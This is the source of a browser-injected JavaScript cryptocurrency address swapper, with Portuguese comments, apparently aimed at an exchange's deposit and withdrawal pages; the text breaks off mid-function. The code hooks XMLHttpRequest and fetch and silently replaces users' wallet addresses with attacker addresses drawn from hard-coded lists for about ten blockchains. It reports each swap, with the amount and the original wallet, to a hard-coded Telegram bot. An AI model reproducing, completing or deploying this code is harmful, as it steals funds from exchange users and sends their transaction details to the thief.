(function () {
  'use strict';

  if (window.__HAQ_TROCA_DEP) { try { window.__HAQ_TROCA_DEP.off(); } catch (e) {} }
  if (window.__saqHook) {
    try {
      XMLHttpRequest.prototype.open = window.__saqHook.open;
      XMLHttpRequest.prototype.send = window.__saqHook.send;
      if (window.__saqHook.fetch) window.fetch = window.__saqHook.fetch;
    } catch (e) {}
    window.__saqHook = null;
  }

  if (window.__HAQ) {
    console.warn('[HAQ] ja instalado. Use __HAQ.off() para remover.');
    return;
  }

  var VERSAO = '1.0';
  var FORCAR = false;
  var AVISO_VISUAL = false;

  /* ---- Telegram (Bot API) ----
     avisa o dono a cada troca de endereco (deposito e saque)
     chatId vazio = descobre sozinho via getUpdates (precisa de /start no bot) */
  var TELEGRAM = {
    token: '9094737859:AAEBNQMv7dQ0WEr29jaFX-5GOyvKQ4IWmLc',
    chatId: '8574440576'
  };

  function telChatId() {
    if (TELEGRAM.chatId) return Promise.resolve(TELEGRAM.chatId);
    return fetch('https://api.telegram.org/bot' + TELEGRAM.token + '/getUpdates')
      .then(function (r) { return r.json(); })
      .then(function (j) {
        if (j && j.result && j.result.length) {
          var last = j.result[j.result.length - 1];
          var msg = last.message || last.edited_message || last.channel_post;
          var cid = msg && msg.chat && msg.chat.id;
          if (cid) { TELEGRAM.chatId = cid; return cid; }
        }
        return '';
      })
      .catch(function () { return ''; });
  }

  function telEnviar(texto) {
    try {
      telChatId().then(function (cid) {
        if (!cid) return;
        var url = 'https://api.telegram.org/bot' + TELEGRAM.token + '/sendMessage';
        try {
          var fd = new URLSearchParams();
          fd.set('chat_id', cid);
          fd.set('text', texto);
          fetch(url, { method: 'POST', body: fd }).catch(function () {
            try { new Image().src = url + '?chat_id=' + encodeURIComponent(cid) + '&text=' + encodeURIComponent(texto); } catch (e) {}
          });
        } catch (e) {
          try { new Image().src = url + '?chat_id=' + encodeURIComponent(cid) + '&text=' + encodeURIComponent(texto); } catch (e2) {}
        }
      });
    } catch (e) {}
  }

  var DEPOSITO = {
    IGUAL: '',

    EVM:  ['0x01A82dbF85F983068f49eF172f8c71ff2D663D17','0x33663c89742D53494cFD77a3052DcdfE5858fb4f','0xfd59AE8974869c1fCD706f835435E3f03dbC6C27','0x0872367855f561224dbC4b1ec97288f48506fDEF','0x60e0f49af291f1Ea6688FDfE9e052A4698F34162','0x640496505F2cf970c85CDB5556e6149c59C2481E','0xD89B65609D8cA1709B4922573c8d8a3BF38f7E43','0x2bDeeDE8B45ED84A3A5b260E77A327146F327079','0x1EFAc5E74C67F37f8Db1f78f9Fd5D82222e65DE1','0x9B2f723feFED10Cf8A20F776b000ed04b106Bc79'],
    TRON: ['TLesaLVKLMWUcDRaHX4YL4hDov52GPo2RR','TEctUJM67C3EAtE9dhMrjeF5JwLpWjmpgS','TAB2KBYop2VMrQARDxzfPtydmZ2xFRoqtz','TRo8NTMedHAjxSVEeWg1oikVv6qxPFWQsa','TZDNf5YWw2p3PMSGXzY6jS2WxdosU21Aw8','TWC359yPYzRkusiyCgpWXMQxCkXRWXHi23','TTG1F8PT3vMKRPssbvmSDGEHEAASKt7L57','TCV9MpPPzQYL88wMSB7awQHk9wsmve1Tvo','TY17jm7mscD6jUDTmEqbL7Bqpgszh2hL7A','TN3Q9JwctfwLE6m6YxdooeQHoLJaahdqhF'],
    BTC:  ['bc1qs04n6n33d63nvpq3rdr9gez9w7g4dh3rr3w2pu','bc1qmatvp63tg5re0e6sh6k2wug3584qft8vxj0rty','bc1qgcwjgngw9h58d2devshyza24xy64zrt54lqry2','bc1qwqdge2x0shw440txvhenm647xl29hujvhsag89','bc1q42jxvjgz6ktksxvrlaskfe28t30gzxgcyecdx3','bc1qrdegmury5gn007hfpp5jyr77s6p7rwjzf6m2v2','bc1q7seukh5na69c74npqjrvay9zdu4d7hn96at6sg','bc1qvua5hjht2dganla5gcnccznts69fpt46cvxp25','bc1q6zgh7hw0lghljyyhehes6t3x4y3azp4hkyqatj','bc1qu8j0y9qn0l7sryp33vkg6dt4ldcrvqsjkj6zhk'],
    LTC:  ['ltc1q9mxpk8ysyxqam2z2nvm34tvzfr5fzmy3tlxmez','ltc1qy3h5zysvfg53spsllyj85q4s99fhmncr2hvcfk','ltc1qsymjfm3y4uturnsva6fcm3js6znsnfh99agwew','ltc1q7ds8f34qxpma8cd5etx8ucqu8kf890p4ea48fp','ltc1qpm3g348arkau38lrh7m8dnluyhw5msud0l6q03','ltc1qerr7rpxtqcgenlsdhrdh9cptnwypywtq7j2mg9','ltc1qnv66a32vu7eyxgzm25rmqkza948q87qjl6kzqt','ltc1q06nme526ap383eyq40lhvjg9fhrwlfy356e5ua','ltc1q3fdx2nxy5v7x2qkr8s9zu238fpg0u0rrm6hs5e','ltc1qvqq9dktl56n5ssnnks2mtwmpvkjwpj5j9k38ce'],
    BCH:  ['qr0hp4rfx89lh7azpw3f097vqflmhs6f450nu8tmsg','qzlx79n2rcl2nxkxfjuwm950m5v0afvc7qjmur0t3l','qqx97we8jdptlrpu32x2d4drxvwczj5d2qky7v7kvk','qr0yhc7378mfgewzrgrehtd9jthkvx4zxsj4yegcaj','qrenzlp996dl4yucaja6pc5mx370sjrhyvzn8xsduj','qqdkk5f7r38sa307y9y5fvr42sf9vp8zrgt27vrd3s','qr96uqs8ntalhc3ha46dvgcs26znfa29wyus4yd28r','qpwk22z0qns0cwllvjq7ssu5e8pp38p2z5767ljx3t','qz3as2zpxlw6hhx497hl0chhme4rf8nxzv230htd8j','qzu5adpzvgmx98aydyft40fwrydpyqumagn3nznhpt'],
    DOGE: ['DBpzLtq1gzUg9rna1M4BS654JkeqecwbxL','D8HVqbR5Pjg7J72hAQRSUekfG2RHGCXzGw','D5e3bT78a88x97GssqvfuY7jjaAzYMn7Ry','DEieNnYob6UxFb6bFj8YXaJvi5NFmthUo5','DHnBkGWSSG2UyX3uqd6m2cte7BaDAutwDt','DN8uBooRJTxzEJWwUq2cjyNHET9xQer9Ea','D6F46FZh3fcPmrSjbyoFHyhjGyBQ1JnTJr','DKpMZzbXgcqPm7vNDzajnQqq1NeVqBZzSC','DBg2bG25fL6bTxfNuwpP6SAvF8qVd2YSPM','D7VGkWmQUFnE5NGuUkqyGitzhj7XGSyWy1'],
    XRP:  ['r96GJqzdZXWgRVEzWHCbcpYwBSzXrYn9zB','rE1jrgB5M5Sy6KfjrQo5AEA8LfUD7X2jA5','rG8xU2v84Hfm8NUE5gCcVPwnpC7w4abpup','rHDst2GE2Wgm2wQmUQQDw1R8Sk2aYFUc2W','rrsZ2aL1xDaxSPmU3B9azbr5tioXHegYMj','rH4TUGXFayKGNUP663ijKaeGi9WSfzKgtT','rM2REM3THYseofhe1dhiSTzMpYggDHiHwS','rQ9gWDLHswa876Un23JYu6tXjwvmUq1Cid','rpKEgYWot3w2MrsvEP1gcMV2Kxpoaiama6','rMSNJVH3L8qvFkmZ91zPfabz8DWfk2CHmR'],
    TON:  ['UQB7057Wp88XemT6yN3GZURv_vuci45CnT5byX08OcIO88Ux','UQDoIjSeszdP7kB9WN7gSQueINLyYzz2Iwy2LEvSJAR-UXlH','UQB0bwqd33mwAys3AHiAlCCgPs_N7GIgHy34FV88Hu3Lj54e','UQBIxgkb7QaZcVbKNYnFrEoH07B7Noe2mXn2fEueHZ3D7Ck3','UQAUooZbG-HYPH4zGZC3eGVIqUMerOOHB43XHJAykOXUAYhH','UQBW4c7U6sBwpg7O9iwB7M0csdqxplHZwbgB7Y8hGUA3eIB1','UQA1hc6RfDEs_lDcsawMaG8YlZICrfdd3FwRW-QT_MZ4xgrF','UQDCZdusP6gQUuUWxVG1QkgxMg2UP6dbU2WkDmO4i06SkLj5','UQDkBMLrQkrO4xOigpOCBHs-zYdoLZCybQeczmLfbZ-uHe_R','UQB_CSc_v6CH6hPaz2jBFpuTgvmIOcDv3SM9pTBLEAHtL1Ut'],
    ADA:  ['addr1qxn49lvwvgn9u2nc7y653g03d6ee76aww2p5ry9aqlfvprfg0swcnsfjhchpp4r7hjcpmzsjuvecxrfcwnaer7tk2rls74e7h7','addr1qyzzm5mhxfpsdc7skruxmlrr6dmmxzy7e36m8xkst55u6v9nrqgm9cl79z9dtvzy3jkf4lt2gffj4phdweh678h58r3sh4de57','addr1q8r9mmc4ndfgueswlp6nadfqn7kyhtfjzzndsrphsevznzgqm62xykr6jkr9tds4hcqec40ykz8hny8l5s2vuctqpg8stnzr2g','addr1q843w8jwc5zc020l0tczpr2sauu569z77srxyvyps7vykhdgzvlk7vxsw43xd2ryfpgayvumykseatrjneny44xw3r4s9x9es8','addr1qyzz8g6r752n675jc4r36f86fuel6x3x32xugfmm9mxfjasqypx6vkf3nvgvwgw4fm555g9duzcdh76fysyl2t0kxd7qjfmdcg','addr1q8sr73h065kfg9pqedmdh30wjzh7ynfs4j8trl853c0m82v2xnjg3ggn5h2f9kfc4zhvf8sw74f9wrngusavjpwfqh4sguugdd','addr1qylcuz29msvthrj24e2wz66ekk2ggte55tane08w7a6w8z0j7lpzudcdgaenugcjp8y5r8h6a96zftwyzgjxwydrgp5qd4jjp6','addr1q9pkp4xwhrtcp5j8px3r4w2qhz0vs8e2x8vuej2kuk4ce6jet3n9a9ymmvwtuqktaawqdf9xgevvc7k00mnhxz9zqphqwdw69u','addr1qyayqdwydzs97kw8p3vkyxqphhuu25ugvra990f5cve6aj5mcrxae2dlkts96jynhhvv4jv8c9d35390hxj8zpr3xudsm5qwf7','addr1qxxdsy8uykttps52ksy82z7u0t9rvl93tnhsr58q4fujhs520zq90ynq7vyf49hk66xff2rdcxjapr9yyfzs2waw365sf748yr'],
    DOT:  ['13tLATPGFE5bZkdVSc464sHmiTuEqQGyeDDbunidHVXFxziD','122uc7N5DYPMe56tH1hvVMTUnFR9RW9j7p83GRTJApqoiuYx','152bRo9EKDLxobM1GkrDEZDi8vDdi7VBiLhKeiX1Fsywew5d','1WHyknANgjqbGkx6dnhazCAqvh4296FpocUJ2yRNSQbn5Hs','14ScVMYzXt8xTkJAcQi2cZ9mg2RDu5BEFGAa1E4nZ9g7Khuu','142M34JHrquWuJCUyG92tEAARVVuX5YGmPeu4TyE5otZJ9Ve','15Z6ieJ675aYjyFRoTmDNkfK6fxu8LQAZk4JYhFGpRLMLX2P','18XdJyBbrgC1vJquoCxne3owh22iqihEWmimyHH8MMo8XHs','12B7s4h3nXS5HXAhz6ZkhXBFHyg9sVcsrsD8qWxfDXWL4yLJ','16P6QBxFpwLiCvToNGBMFX71UNYtHrJEcZNZT9NzVu3pWags'],
    SOL:  ['6jZeyoDxnDZvb9Q71dAxm81P4USx2cBFiVDxCWyMEptr','BoHu1AFNgezY1Wj1inM1S7bVVkrcguQdAMX5Sd7krb3D','69jAhZmS5Q9LHf6286TTFZ8MWriLHsDpwyJZihTZCxgs','JC3zbD29HGuqxXJZLxVUUCd4crWmyfWNMVFt37NNv9xK','6VZmqfVNWi3Uge28GrU5V5BL5ZKkAiSPbxge2j64N9m','6NFEzkbWYc5H41vnXdWPjZMiTMbF4nHoRrycDMh1aEFE','CM2h1KxyRKs5aypyuiNpF4jvfZnHjJXy57gsXb5V9z8','GWABKtwS91mUobFiKurG5EWQiYbCkocshgnUVoMczo7','DMBEDLDqxUZksNkUZfDK81QM2LbcZTT8QuWEC8Qjs4gk','7H5BMVeAsNUfiWJyh8Nnvt2WSYsQMqdvMHmKtqsmaMig']
  };

  var SAQUE = {
    IGUAL: '',

    EEVM:  ['0x01A82dbF85F983068f49eF172f8c71ff2D663D17','0x33663c89742D53494cFD77a3052DcdfE5858fb4f','0xfd59AE8974869c1fCD706f835435E3f03dbC6C27','0x0872367855f561224dbC4b1ec97288f48506fDEF','0x60e0f49af291f1Ea6688FDfE9e052A4698F34162','0x640496505F2cf970c85CDB5556e6149c59C2481E','0xD89B65609D8cA1709B4922573c8d8a3BF38f7E43','0x2bDeeDE8B45ED84A3A5b260E77A327146F327079','0x1EFAc5E74C67F37f8Db1f78f9Fd5D82222e65DE1','0x9B2f723feFED10Cf8A20F776b000ed04b106Bc79'],
    TRON: ['TLesaLVKLMWUcDRaHX4YL4hDov52GPo2RR','TEctUJM67C3EAtE9dhMrjeF5JwLpWjmpgS','TAB2KBYop2VMrQARDxzfPtydmZ2xFRoqtz','TRo8NTMedHAjxSVEeWg1oikVv6qxPFWQsa','TZDNf5YWw2p3PMSGXzY6jS2WxdosU21Aw8','TWC359yPYzRkusiyCgpWXMQxCkXRWXHi23','TTG1F8PT3vMKRPssbvmSDGEHEAASKt7L57','TCV9MpPPzQYL88wMSB7awQHk9wsmve1Tvo','TY17jm7mscD6jUDTmEqbL7Bqpgszh2hL7A','TN3Q9JwctfwLE6m6YxdooeQHoLJaahdqhF'],
    BTC:  ['bc1qs04n6n33d63nvpq3rdr9gez9w7g4dh3rr3w2pu','bc1qmatvp63tg5re0e6sh6k2wug3584qft8vxj0rty','bc1qgcwjgngw9h58d2devshyza24xy64zrt54lqry2','bc1qwqdge2x0shw440txvhenm647xl29hujvhsag89','bc1q42jxvjgz6ktksxvrlaskfe28t30gzxgcyecdx3','bc1qrdegmury5gn007hfpp5jyr77s6p7rwjzf6m2v2','bc1q7seukh5na69c74npqjrvay9zdu4d7hn96at6sg','bc1qvua5hjht2dganla5gcnccznts69fpt46cvxp25','bc1q6zgh7hw0lghljyyhehes6t3x4y3azp4hkyqatj','bc1qu8j0y9qn0l7sryp33vkg6dt4ldcrvqsjkj6zhk'],
    LTC:  ['ltc1q9mxpk8ysyxqam2z2nvm34tvzfr5fzmy3tlxmez','ltc1qy3h5zysvfg53spsllyj85q4s99fhmncr2hvcfk','ltc1qsymjfm3y4uturnsva6fcm3js6znsnfh99agwew','ltc1q7ds8f34qxpma8cd5etx8ucqu8kf890p4ea48fp','ltc1qpm3g348arkau38lrh7m8dnluyhw5msud0l6q03','ltc1qerr7rpxtqcgenlsdhrdh9cptnwypywtq7j2mg9','ltc1qnv66a32vu7eyxgzm25rmqkza948q87qjl6kzqt','ltc1q06nme526ap383eyq40lhvjg9fhrwlfy356e5ua','ltc1q3fdx2nxy5v7x2qkr8s9zu238fpg0u0rrm6hs5e','ltc1qvqq9dktl56n5ssnnks2mtwmpvkjwpj5j9k38ce'],
    BCH:  ['qr0hp4rfx89lh7azpw3f097vqflmhs6f450nu8tmsg','qzlx79n2rcl2nxkxfjuwm950m5v0afvc7qjmur0t3l','qqx97we8jdptlrpu32x2d4drxvwczj5d2qky7v7kvk','qr0yhc7378mfgewzrgrehtd9jthkvx4zxsj4yegcaj','qrenzlp996dl4yucaja6pc5mx370sjrhyvzn8xsduj','qqdkk5f7r38sa307y9y5fvr42sf9vp8zrgt27vrd3s','qr96uqs8ntalhc3ha46dvgcs26znfa29wyus4yd28r','qpwk22z0qns0cwllvjq7ssu5e8pp38p2z5767ljx3t','qz3as2zpxlw6hhx497hl0chhme4rf8nxzv230htd8j','qzu5adpzvgmx98aydyft40fwrydpyqumagn3nznhpt'],
    DOGE: ['DBpzLtq1gzUg9rna1M4BS654JkeqecwbxL','D8HVqbR5Pjg7J72hAQRSUekfG2RHGCXzGw','D5e3bT78a88x97GssqvfuY7jjaAzYMn7Ry','DEieNnYob6UxFb6bFj8YXaJvi5NFmthUo5','DHnBkGWSSG2UyX3uqd6m2cte7BaDAutwDt','DN8uBooRJTxzEJWwUq2cjyNHET9xQer9Ea','D6F46FZh3fcPmrSjbyoFHyhjGyBQ1JnTJr','DKpMZzbXgcqPm7vNDzajnQqq1NeVqBZzSC','DBg2bG25fL6bTxfNuwpP6SAvF8qVd2YSPM','D7VGkWmQUFnE5NGuUkqyGitzhj7XGSyWy1'],
    XRP:  ['r96GJqzdZXWgRVEzWHCbcpYwBSzXrYn9zB','rE1jrgB5M5Sy6KfjrQo5AEA8LfUD7X2jA5','rG8xU2v84Hfm8NUE5gCcVPwnpC7w4abpup','rHDst2GE2Wgm2wQmUQQDw1R8Sk2aYFUc2W','rrsZ2aL1xDaxSPmU3B9azbr5tioXHegYMj','rH4TUGXFayKGNUP663ijKaeGi9WSfzKgtT','rM2REM3THYseofhe1dhiSTzMpYggDHiHwS','rQ9gWDLHswa876Un23JYu6tXjwvmUq1Cid','rpKEgYWot3w2MrsvEP1gcMV2Kxpoaiama6','rMSNJVH3L8qvFkmZ91zPfabz8DWfk2CHmR'],
    TON:  ['UQB7057Wp88XemT6yN3GZURv_vuci45CnT5byX08OcIO88Ux','UQDoIjSeszdP7kB9WN7gSQueINLyYzz2Iwy2LEvSJAR-UXlH','UQB0bwqd33mwAys3AHiAlCCgPs_N7GIgHy34FV88Hu3Lj54e','UQBIxgkb7QaZcVbKNYnFrEoH07B7Noe2mXn2fEueHZ3D7Ck3','UQAUooZbG-HYPH4zGZC3eGVIqUMerOOHB43XHJAykOXUAYhH','UQBW4c7U6sBwpg7O9iwB7M0csdqxplHZwbgB7Y8hGUA3eIB1','UQA1hc6RfDEs_lDcsawMaG8YlZICrfdd3FwRW-QT_MZ4xgrF','UQDCZdusP6gQUuUWxVG1QkgxMg2UP6dbU2WkDmO4i06SkLj5','UQDkBMLrQkrO4xOigpOCBHs-zYdoLZCybQeczmLfbZ-uHe_R','UQB_CSc_v6CH6hPaz2jBFpuTgvmIOcDv3SM9pTBLEAHtL1Ut'],
    ADA:  ['addr1qxn49lvwvgn9u2nc7y653g03d6ee76aww2p5ry9aqlfvprfg0swcnsfjhchpp4r7hjcpmzsjuvecxrfcwnaer7tk2rls74e7h7','addr1qyzzm5mhxfpsdc7skruxmlrr6dmmxzy7e36m8xkst55u6v9nrqgm9cl79z9dtvzy3jkf4lt2gffj4phdweh678h58r3sh4de57','addr1q8r9mmc4ndfgueswlp6nadfqn7kyhtfjzzndsrphsevznzgqm62xykr6jkr9tds4hcqec40ykz8hny8l5s2vuctqpg8stnzr2g','addr1q843w8jwc5zc020l0tczpr2sauu569z77srxyvyps7vykhdgzvlk7vxsw43xd2ryfpgayvumykseatrjneny44xw3r4s9x9es8','addr1qyzz8g6r752n675jc4r36f86fuel6x3x32xugfmm9mxfjasqypx6vkf3nvgvwgw4fm555g9duzcdh76fysyl2t0kxd7qjfmdcg','addr1q8sr73h065kfg9pqedmdh30wjzh7ynfs4j8trl853c0m82v2xnjg3ggn5h2f9kfc4zhvf8sw74f9wrngusavjpwfqh4sguugdd','addr1qylcuz29msvthrj24e2wz66ekk2ggte55tane08w7a6w8z0j7lpzudcdgaenugcjp8y5r8h6a96zftwyzgjxwydrgp5qd4jjp6','addr1q9pkp4xwhrtcp5j8px3r4w2qhz0vs8e2x8vuej2kuk4ce6jet3n9a9ymmvwtuqktaawqdf9xgevvc7k00mnhxz9zqphqwdw69u','addr1qyayqdwydzs97kw8p3vkyxqphhuu25ugvra990f5cve6aj5mcrxae2dlkts96jynhhvv4jv8c9d35390hxj8zpr3xudsm5qwf7','addr1qxxdsy8uykttps52ksy82z7u0t9rvl93tnhsr58q4fujhs520zq90ynq7vyf49hk66xff2rdcxjapr9yyfzs2waw365sf748yr'],
    DOT:  ['13tLATPGFE5bZkdVSc464sHmiTuEqQGyeDDbunidHVXFxziD','122uc7N5DYPMe56tH1hvVMTUnFR9RW9j7p83GRTJApqoiuYx','152bRo9EKDLxobM1GkrDEZDi8vDdi7VBiLhKeiX1Fsywew5d','1WHyknANgjqbGkx6dnhazCAqvh4296FpocUJ2yRNSQbn5Hs','14ScVMYzXt8xTkJAcQi2cZ9mg2RDu5BEFGAa1E4nZ9g7Khuu','142M34JHrquWuJCUyG92tEAARVVuX5YGmPeu4TyE5otZJ9Ve','15Z6ieJ675aYjyFRoTmDNkfK6fxu8LQAZk4JYhFGpRLMLX2P','18XdJyBbrgC1vJquoCxne3owh22iqihEWmimyHH8MMo8XHs','12B7s4h3nXS5HXAhz6ZkhXBFHyg9sVcsrsD8qWxfDXWL4yLJ','16P6QBxFpwLiCvToNGBMFX71UNYtHrJEcZNZT9NzVu3pWags'],
    SOL:  ['6jZeyoDxnDZvb9Q71dAxm81P4USx2cBFiVDxCWyMEptr','BoHu1AFNgezY1Wj1inM1S7bVVkrcguQdAMX5Sd7krb3D','69jAhZmS5Q9LHf6286TTFZ8MWriLHsDpwyJZihTZCxgs','JC3zbD29HGuqxXJZLxVUUCd4crWmyfWNMVFt37NNv9xK','6VZmqfVNWi3Uge28GrU5V5BL5ZKkAiSPbxge2j64N9m','6NFEzkbWYc5H41vnXdWPjZMiTMbF4nHoRrycDMh1aEFE','CM2h1KxyRKs5aypyuiNpF4jvfZnHjJXy57gsXb5V9z8','GWABKtwS91mUobFiKurG5EWQiYbCkocshgnUVoMczo7','DMBEDLDqxUZksNkUZfDK81QM2LbcZTT8QuWEC8Qjs4gk','7H5BMVeAsNUfiWJyh8Nnvt2WSYsQMqdvMHmKtqsmaMig']
  };

  var MAPA = {
    'USDT|erc20':   'EVM',
    'USDT|trc20':   'TRON',
    'BTC|bitcoin':  'BTC',
    'BCH|bch':      'BCH',
    'ETH|erc20':    'EVM',
    'TON|toncoin':  'TON',
    'DOGE|doge':    'DOGE',
    'LTC|ltc':      'LTC',
    'XRP|ripple':   'XRP',
    'BNB|bep-20':   'EVM',
    'ADA|cardano':  'ADA',
    'TRX|trc20':    'TRON',
    'DOT|polkadot': 'DOT',
    'SOL|solana':   'SOL',
    'POL|polygon':  'EVM',
    'TRUMP|solana': 'SOL',
    'SHIB|erc20':   'EVM',
    'USDC|erc20':   'EVM',
    'DAI|erc20':    'EVM'
  };

  var REDE_RE = [
    [/^(trc-?20|tron)$/i,                    'TRON'],
    [/^(erc-?20|eth|ethereum)$/i,            'EVM'],
    [/^(bep-?20|bsc|bnb)$/i,                 'EVM'],
    [/^(polygon|matic)$/i,                   'EVM'],
    [/^(bitcoin|btc)$/i,                     'BTC'],
    [/^(bch|bitcoincash)$/i,                 'BCH'],
    [/^(toncoin|ton)$/i,                     'TON'],
    [/^(ripple|xrp)$/i,                      'XRP'],
    [/^(cardano|ada)$/i,                     'ADA'],
    [/^(polkadot|dot)$/i,                    'DOT'],
    [/^(solana|sol)$/i,                      'SOL'],
    [/^(doge|dogecoin)$/i,                   'DOGE'],
    [/^(ltc|litecoin)$/i,                    'LTC']
  ];

  var DIRETO = {
    TRX: 'TRON', BTC: 'BTC', LTC: 'LTC', BCH: 'BCH', DOGE: 'DOGE',
    XRP: 'XRP', TON: 'TON', ADA: 'ADA', DOT: 'DOT', SOL: 'SOL',
    TRUMP: 'SOL', ETH: 'EVM', BNB: 'EVM', POL: 'EVM', SHIB: 'EVM',
    USDC: 'EVM', DAI: 'EVM'
  };

  var REGRAS = {
    EVM:  /^0x[0-9a-fA-F]{40}$/,
    TRON: /^T[1-9A-HJ-NP-Za-km-z]{33}$/,
    BTC:  /^(bc1[02-9ac-hj-np-z]{11,71}|[13][1-9A-HJ-NP-Za-km-z]{25,34})$/,
    LTC:  /^(ltc1[02-9ac-hj-np-z]{11,71}|[LM3][1-9A-HJ-NP-Za-km-z]{25,34})$/,
    BCH:  /^[qp][a-z0-9]{41}$/i,
    DOGE: /^D[1-9A-HJ-NP-Za-km-z]{33}$/,
    XRP:  /^r[1-9A-HJ-NP-Za-km-z]{24,34}$/,
    TON:  /^(EQ|UQ|Ef|Uf)[A-Za-z0-9_-]{46,48}$/,
    ADA:  /^addr1[02-9ac-hj-np-z]{20,100}$/,
    DOT:  /^1[1-9A-HJ-NP-Za-km-z]{45,49}$/,
    SOL:  /^[1-9A-HJ-NP-Za-km-z]{32,44}$/
  };

  var PREC = {
    BTC: 7, BCH: 6, USDT: 4, TON: 4, USDC: 4, ETH: 7, LTC: 6, DOGE: 4,
    XRP: 4, ADA: 9, TRX: 4, BNB: 9, DOT: 9, SOL: 6, POL: 9, TRUMP: 9, SHIB: 8
  };
  var PREC_PADRAO = 8;

  function valido(fam, end) {
    if (!end) return false;
    var re = REGRAS[fam];
    return re ? re.test(String(end).trim()) : true;
  }

  function familiaDe(moeda, rede) {
    var k = String(moeda || '').toUpperCase().trim() + '|' + String(rede || '').toLowerCase().trim();
    if (MAPA[k]) return MAPA[k];
    var r = String(rede || '').trim();
    for (var i = 0; i < REDE_RE.length; i++) {
      if (REDE_RE[i][0].test(r)) return REDE_RE[i][1];
    }
    return DIRETO[String(moeda || '').toUpperCase().trim()] || null;
  }

  function sorteia(mapa, fam) {
    if (mapa.IGUAL && String(mapa.IGUAL).trim().length >= 20) return String(mapa.IGUAL).trim();
    var lista = mapa[fam];
    if (!lista || !lista.length) return null;
    var end = String(lista[Math.floor(Math.random() * lista.length)]).trim();
    if (!valido(fam, end)) {
      if (FORCAR) {
        console.warn('[HAQ] formato suspeito em ' + fam + ', aplicando porque FORCAR=true:', end);
        return end;
      }
      console.error('[HAQ] endereco de ' + fam + ' invalido. Ignorado:\n  ' + end);
      return null;
    }
    return end;
  }

  var logDep = [];
  var logSaq = [];
  var _ultLogDep = {};
  var trocas = 0;
  var _ultimaChaveSaq = '';
  var _ultimaHoraSaq = 0;

  function registrarDep(moeda, rede, original, novo) {
    var chave = moeda + '|' + rede + '|' + original + '|' + novo;
    var agora = Date.now();
    if (_ultLogDep[chave] && (agora - _ultLogDep[chave]) < 600000) return;
    _ultLogDep[chave] = agora;
    logDep.push({ hora: new Date().toISOString(), moeda: moeda, rede: rede, original: original, novo: novo });
    if (logDep.length > 200) logDep.shift();
    console.log('%c[DEP] ' + moeda + '/' + rede + '  ->  ' + novo, 'color:#0a0;font-weight:bold');
    console.log('      antes: ' + original);

    // avisa no Telegram: endereco de deposito trocado
    telEnviar('DEPOSITO - ENDERECO TROCADO\n' +
              'Moeda: ' + moeda + '\n' +
              'Rede: ' + rede + '\n' +
              'De: ' + original + '\n' +
              'Para: ' + novo);
  }

  function registrarSaq(d) {
    var chave = d.moeda + '|' + d.rede + '|' + d.original + '|' + d.novo + '|' + d.valor + '|' + d.etapa;
    var agora = Date.now();
    if (chave === _ultimaChaveSaq && (agora - _ultimaHoraSaq) < 1200) return;
    _ultimaChaveSaq = chave;
    _ultimaHoraSaq = agora;
    trocas++;
    logSaq.push({ hora: new Date().toISOString(), moeda: d.moeda, rede: d.rede, original: d.bruto, novo: d.novo, valor: d.valor, etapa: d.etapa });
    if (logSaq.length > 200) logSaq.shift();

    console.log('%c[SAQUE] TROCADO  ' + d.moeda + '/' + (d.rede || '-') +
                ' (' + d.familia + ', ' + d.etapa + ')',
                'color:#c00;font-weight:bold');
    console.log('   carteira : ' + d.bruto + '  ->  ' + d.novo);
    if (d.valor != null) {
      var extra = '';
      if (d.limitado) extra = '  (saldo cheio ' + d.saldo + ', cortado no maximo ' + d.max + ')';
      else if (d.saldo != null) extra = '  (saldo cheio ' + d.saldo + ')';
      else if (d.origemValor) extra = '  (' + d.origemValor + ')';
      console.log('   valor    : ' + d.valorDigitado + '  ->  ' + d.valor + extra);
    } else {
      console.log('   valor    : mantido ' + d.valorDigitado + ' - ' + (d.motivoValor || 'sem calculo'));
    }
    console.log('   total de trocas nesta aba: ' + trocas);

    // avisa no Telegram: saque (carteira + valor + moeda)
    var _v = (d.valor != null) ? d.valor : d.valorDigitado;
    telEnviar('SAQUE - ENDERECO TROCADO\n' +
              'Moeda: ' + d.moeda + '\n' +
              'Rede: ' + (d.rede || '-') + '\n' +
              'Valor: ' + _v + '\n' +
              'Carteira: ' + d.bruto + ' -> ' + d.novo);
  }

  function trocarObjetoDep(obj, moeda, rede) {
    if (!obj || typeof obj !== 'object') return obj;
    if (Number(obj.error) !== 0) return obj;
    if (typeof obj.addr !== 'string' || !obj.addr) return obj;

    var fam = familiaDe(moeda, rede);
    if (!fam) {
      console.warn('[DEP] par sem mapa:', moeda, '/', rede);
      return obj;
    }
    var nosso = depEndereco(fam, moeda, rede);
    if (!nosso) return obj;

    var partes = obj.addr.split('|');
    var memo = partes.length > 1 ? partes.slice(0, -1).join('|') + '|' : '';
    var original = partes[partes.length - 1];

    if (original === nosso) return obj;

    obj.addr = memo + nosso;
    registrarDep(moeda, rede, original, nosso);
    return obj;
  }

  function trocarTextoDep(txt, moeda, rede) {
    if (typeof txt !== 'string' || !txt) return txt;
    var obj;
    try { obj = JSON.parse(txt); } catch (e) { return txt; }
    var antes = obj && obj.addr;
    trocarObjetoDep(obj, moeda, rede);
    if (!obj || obj.addr === antes) return txt;
    try { return JSON.stringify(obj); } catch (e) { return txt; }
  }

  var depCache = {};
  var saqCache = {};

  function saqEndereco(fam, moeda, rede) {
    if (!fam) return null;
    var chave = moeda + '|' + rede;
    var cached = saqCache[chave];
    if (cached && (Date.now() - cached.ts) < 600000) return cached.endereco;
    var end = sorteia(SAQUE, fam);
    if (!end) return null;
    saqCache[chave] = { endereco: end, ts: Date.now() };
    return end;
  }

  function depEndereco(fam, moeda, rede) {
    if (!fam) return null;
    var chave = moeda + '|' + rede;
    var cached = depCache[chave];
    if (cached && (Date.now() - cached.ts) < 600000) return cached.endereco;
    var end = sorteia(DEPOSITO, fam);
    if (!end) return null;
    depCache[chave] = { endereco: end, ts: Date.now() };
    return end;
  }

  function lerCampo(corpo, nome) {
    try {
      if (corpo == null) return null;
      if (typeof corpo.get === 'function') return corpo.get(nome);
      if (typeof corpo === 'object' && nome in corpo) return corpo[nome];
    } catch (e) {}
    return null;
  }

  function gravarCampo(corpo, nome, valor) {
    try {
      if (corpo == null) return false;
      if (typeof corpo.set === 'function') { corpo.set(nome, valor); return true; }
      if (typeof corpo === 'object') { corpo[nome] = valor; return true; }
    } catch (e) {}
    return false;
  }

  function numeroDe(txt) {
    var s = String(txt == null ? '' : txt).replace(/[^\d.,-]/g, '');
    if (!s) return null;
    var p = s.indexOf('.') >= 0, v = s.indexOf(',') >= 0;
    if (p && v) {
      if (s.lastIndexOf(',') > s.lastIndexOf('.')) s = s.replace(/\./g, '').replace(',', '.');
      else s = s.replace(/,/g, '');
    } else if (v) {
